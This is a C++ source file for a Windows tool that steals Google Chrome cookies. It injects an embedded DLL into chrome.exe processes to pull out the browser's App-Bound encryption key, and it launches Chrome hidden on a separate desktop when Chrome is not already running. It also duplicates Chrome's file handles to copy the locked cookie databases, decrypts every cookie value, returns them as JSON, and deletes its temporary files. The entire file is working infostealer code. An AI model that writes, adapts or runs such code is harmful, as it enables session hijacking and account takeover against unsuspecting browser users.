// ChromeProvider.cpp
#define PROVIDER_EXPORTS
#include "../../src/Cookier.h"
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <chrono>
#include <unordered_map>
#include <iostream>
#include <sstream>
#include <cstring>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

static bool g_verbose = false;
static const std::string KEY_PATH = "C:\\Users\\Public\\chrome_abe_key.bin";

static std::string Narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

static void EnablePrivilege(LPCWSTR privilege) {
    HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (LookupPrivilegeValueW(NULL, privilege, &tp.Privileges[0].Luid)) AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }
}

static std::vector<DWORD> GetChromePids() {
    std::vector<DWORD> pids; PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snap, &pe)) { do { if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0) pids.push_back(pe.th32ProcessID); } while (Process32NextW(snap, &pe)); }
    CloseHandle(snap); return pids;
}

static void KillChrome() {
    auto pids = GetChromePids();
    for (DWORD pid : pids) {
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
    }
}

static int InjectDll(const std::string& dllPathA, DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return 0;
    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, dllPathA.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { CloseHandle(hProcess); return 0; }
    WriteProcessMemory(hProcess, remoteMem, dllPathA.c_str(), dllPathA.size() + 1, nullptr);
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA"), remoteMem, 0, nullptr);
    int result = 0;
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread);
        HMODULE hMods[1024]; DWORD cbNeeded;
        if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                    if (std::string(szModName).find("Cookier_ChromeInjector_") != std::string::npos) {
                        HMODULE hLocal = LoadLibraryExA(dllPathA.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
                        if (hLocal) {
                            DWORD_PTR offset = (DWORD_PTR)GetProcAddress(hLocal, "TriggerDecryption") - (DWORD_PTR)hLocal;
                            FreeLibrary(hLocal);
                            LPVOID remoteFunc = (LPVOID)((DWORD_PTR)hMods[i] + offset);
                            HANDLE hTrigger = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteFunc, nullptr, 0, nullptr);
                            if (hTrigger) { WaitForSingleObject(hTrigger, INFINITE); CloseHandle(hTrigger); result = 1; }
                        }
                        break;
                    }
                }
            }
        }
    }
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); CloseHandle(hProcess); return result;
}

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX { PVOID Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue; ULONG GrantedAccess; USHORT CreatorBackTraceIndex; USHORT ObjectTypeIndex; ULONG HandleAttributes; ULONG Reserved; } SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX { ULONG_PTR NumberOfHandles; ULONG_PTR Reserved; SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1]; } SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

static bool CopyHandleToFile(HANDLE hSource, const std::wstring& destPath) {
    LARGE_INTEGER size = {}; 
    if (!GetFileSizeEx(hSource, &size)) return false;
    if (size.QuadPart == 0) { HANDLE h = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (h != INVALID_HANDLE_VALUE) CloseHandle(h); return true; }
    HANDLE hMap = CreateFileMappingW(hSource, NULL, PAGE_READONLY, 0, 0, NULL); 
    if (!hMap) return false;
    void* base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0); 
    if (!base) { CloseHandle(hMap); return false; }
    HANDLE hOut = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written = 0; BOOL ok = WriteFile(hOut, base, (DWORD)size.QuadPart, &written, NULL);
    CloseHandle(hOut); UnmapViewOfFile(base); CloseHandle(hMap); 
    return ok && written == (DWORD)size.QuadPart;
}

static std::unordered_map<std::wstring, HANDLE> CopyCookiesViaHandleDuplication(const std::vector<DWORD>& chromePids) {
    std::unordered_map<std::wstring, HANDLE> lockedDbs;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    ULONG bufferSize = 1 << 20; std::vector<BYTE> buffer(bufferSize); ULONG returned = 0; NTSTATUS status = 0;
    for (int tries = 0; tries < 20; ++tries) {
        buffer.resize(bufferSize); status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, buffer.data(), bufferSize, &returned);
        if (status == STATUS_INFO_LENGTH_MISMATCH) { bufferSize = returned + 0x10000; continue; } break;
    }
    if (status < 0) return lockedDbs;
    auto info = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
    std::unordered_map<DWORD, HANDLE> processHandles;
    for (DWORD pid : chromePids) { 
        HANDLE h = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); 
        if (h) processHandles[pid] = h; 
    }
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
        auto& e = info->Handles[i]; auto it = processHandles.find((DWORD)e.UniqueProcessId); if (it == processHandles.end()) continue;
        HANDLE hDup = NULL;
        if (DuplicateHandle(it->second, (HANDLE)e.HandleValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            if (GetFileType(hDup) == FILE_TYPE_DISK) {
                wchar_t path[32768] = {}; DWORD len = GetFinalPathNameByHandleW(hDup, path, 32768, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
                if (len > 0) {
                    std::wstring p(path, len);
                    if (p.find(L"Network\\Cookies") != std::wstring::npos) {
                        if (lockedDbs.find(p) == lockedDbs.end()) {
                            lockedDbs[p] = hDup;
                            continue;
                        }
                    }
                }
            }
            CloseHandle(hDup);
        }
    }
    for (auto& pair : processHandles) CloseHandle(pair.second);
    return lockedDbs;
}

static std::vector<std::wstring> GetProfilesOnDisk(const std::wstring& userDataDir) {
    std::vector<std::wstring> profiles;
    try {
        for (const auto& entry : fs::directory_iterator(userDataDir, fs::directory_options::skip_permission_denied)) {
            try {
                if (entry.is_directory()) {
                    fs::path cookies = entry.path() / L"Network" / L"Cookies";
                    if (fs::exists(cookies)) {
                        profiles.push_back(entry.path().filename().wstring());
                    }
                }
            } catch (...) {}
        }
    } catch (...) {}
    return profiles;
}

static bool ExtractCookiesFromDb(const std::wstring& dbPath, const std::vector<BYTE>& aesKey, json& outArray) {
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(Narrow(dbPath).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        return false;
    }
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies;", -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        return false;
    }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string val; const void* enc = sqlite3_column_blob(stmt, 2); int encLen = sqlite3_column_bytes(stmt, 2);
        if (enc && encLen >= 31 && ((BYTE*)enc)[0] == 'v' && ((BYTE*)enc)[1] == '2' && ((BYTE*)enc)[2] == '0') {
            BCRYPT_ALG_HANDLE hAlg; BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
            BCRYPT_KEY_HANDLE hKey; BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)aesKey.data(), 32, 0);
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai; BCRYPT_INIT_AUTH_MODE_INFO(ai);
            ai.pbNonce = (PUCHAR)enc + 3; ai.cbNonce = 12; ai.pbTag = (PUCHAR)enc + encLen - 16; ai.cbTag = 16;
            std::vector<BYTE> pt(encLen - 31); ULONG ptLen = 0;
            if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)enc + 15, encLen - 31, &ai, nullptr, 0, pt.data(), (ULONG)pt.size(), &ptLen, 0))) val.assign(pt.begin(), pt.begin() + ptLen);
            BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
        }
        outArray.push_back({ {"host_key", (char*)sqlite3_column_text(stmt, 0)}, {"name", (char*)sqlite3_column_text(stmt, 1)}, {"value", val}, {"path", (char*)sqlite3_column_text(stmt, 3)}, {"expires_utc", sqlite3_column_int64(stmt, 4)}, {"is_secure", sqlite3_column_int(stmt, 5) != 0}, {"is_httponly", sqlite3_column_int(stmt, 6) != 0} });
    }
    sqlite3_finalize(stmt); sqlite3_close(db);
    return true;
}

extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* profileList, bool verbose) {
    g_verbose = verbose;
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    EnablePrivilege(L"SeDebugPrivilege"); EnablePrivilege(L"SeBackupPrivilege");
    bool weLaunchedChrome = false;
    try {
        DeleteFileA(KEY_PATH.c_str());
        PWSTR localAppData = nullptr;
        SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
        std::wstring userDataDir = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data";
        CoTaskMemFree(localAppData);

        auto allProfilesOnDisk = GetProfilesOnDisk(userDataDir);
        std::vector<std::wstring> targetProfiles;
        if (std::string(profileList) == "all") {
            targetProfiles = allProfilesOnDisk;
        } else {
            std::stringstream ss(profileList);
            std::string item;
            while (std::getline(ss, item, ',')) {
                std::wstring witem(item.begin(), item.end());
                for (auto& p : allProfilesOnDisk) {
                    if (p == witem) { targetProfiles.push_back(p); break; }
                }
            }
        }

        wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
        std::wstring dllPath = std::wstring(tempPath) + L"Cookier_ChromeInjector_" + std::to_wstring(GetCurrentProcessId()) + L".dll";
        DeleteFileW(dllPath.c_str());

        HMODULE hSelf = NULL;
        GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)ExtractCookies, &hSelf);
        HRSRC hRes = FindResourceW(hSelf, MAKEINTRESOURCEW(101), MAKEINTRESOURCEW(10));
        if (!hRes) throw std::runtime_error("Failed to find injector resource in Provider DLL");

        HGLOBAL hMem = LoadResource(hSelf, hRes); void* pData = LockResource(hMem); DWORD size = SizeofResource(hSelf, hRes);
        std::ofstream out(dllPath, std::ios::binary); out.write((char*)pData, size); out.close();

        std::string dllPathA = Narrow(dllPath);
        auto pids = GetChromePids();
        if (pids.empty()) {
            weLaunchedChrome = true;
            HDESK hDesk = CreateDesktopW(L"ChromeExtractorDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
            STARTUPINFOW si = { sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; if (hDesk) si.lpDesktop = L"ChromeExtractorDesktop";
            PROCESS_INFORMATION pi = {};
            wchar_t cmd[] = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --disable-gpu about:blank";
            CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            for (int i = 0; i < 10; ++i) { std::this_thread::sleep_for(std::chrono::seconds(1)); pids = GetChromePids(); if (!pids.empty()) break; }
        }

        if (pids.empty()) throw std::runtime_error("Chrome not found or failed to launch.");
        for (DWORD pid : pids) InjectDll(dllPathA, pid);

        bool keyFound = false;
        for (int i = 0; i < 20; ++i) { std::this_thread::sleep_for(std::chrono::milliseconds(200)); std::ifstream kf(KEY_PATH, std::ios::binary); if (kf.good()) { keyFound = true; break; } }
        if (!keyFound) throw std::runtime_error("Timed out waiting for AES key.");

        std::ifstream keyFile(KEY_PATH, std::ios::binary);
        std::vector<BYTE> aesKey((std::istreambuf_iterator<char>(keyFile)), {});

        auto lockedDbs = CopyCookiesViaHandleDuplication(pids);
        json outJsonObj = json::object();

        for (auto& profileName : targetProfiles) {
            std::wstring dbPath = userDataDir + L"\\" + profileName + L"\\Network\\Cookies";
            std::wstring destBase = L"C:\\Users\\Public\\cookier_" + profileName;
            std::wstring destDb = destBase + L".db";
            
            std::wstring suffix = L"\\" + profileName + L"\\Network\\Cookies";
            HANDLE hDb = NULL, hWal = NULL, hShm = NULL;

            for (auto& pair : lockedDbs) {
                if (pair.first.find(suffix) != std::wstring::npos) {
                    if (pair.first.find(L"-wal") != std::wstring::npos) hWal = pair.second;
                    else if (pair.first.find(L"-shm") != std::wstring::npos) hShm = pair.second;
                    else hDb = pair.second;
                }
            }

            bool copied = false;
            if (hDb) { copied = CopyHandleToFile(hDb, destDb); }
            else if (fs::exists(dbPath)) { copied = CopyFileW(dbPath.c_str(), destDb.c_str(), FALSE); }
            
            if (copied) {
                std::wstring walPath = dbPath + L"-wal"; std::wstring destWal = destBase + L".db-wal";
                if (hWal) CopyHandleToFile(hWal, destWal);
                else if (fs::exists(walPath)) CopyFileW(walPath.c_str(), destWal.c_str(), FALSE);
                
                std::wstring shmPath = dbPath + L"-shm"; std::wstring destShm = destBase + L".db-shm";
                if (hShm) CopyHandleToFile(hShm, destShm);
                else if (fs::exists(shmPath)) CopyFileW(shmPath.c_str(), destShm.c_str(), FALSE);
                
                json profileCookies = json::array();
                if (ExtractCookiesFromDb(destDb, aesKey, profileCookies)) {
                    outJsonObj[Narrow(profileName)] = profileCookies;
                }
                
                DeleteFileW(destDb.c_str());
                DeleteFileW(destWal.c_str());
                DeleteFileW(destShm.c_str());
            }
        }

        for (auto& pair : lockedDbs) CloseHandle(pair.second);

        std::string jsonStr = outJsonObj.dump(2, ' ', false, json::error_handler_t::replace);
        *outJson = (char*)CoTaskMemAlloc(jsonStr.length() + 1);
        if (*outJson) memcpy(*outJson, jsonStr.c_str(), jsonStr.length() + 1);

        DeleteFileA(KEY_PATH.c_str()); DeleteFileW(dllPath.c_str());
        if (weLaunchedChrome) KillChrome();
        CoUninitialize();
        return true;
    } catch (const std::exception& e) {
        std::cerr << "[!] ChromeProvider Error: " << e.what() << "\n";
        if (weLaunchedChrome) KillChrome();
        CoUninitialize();
        return false;
    }
}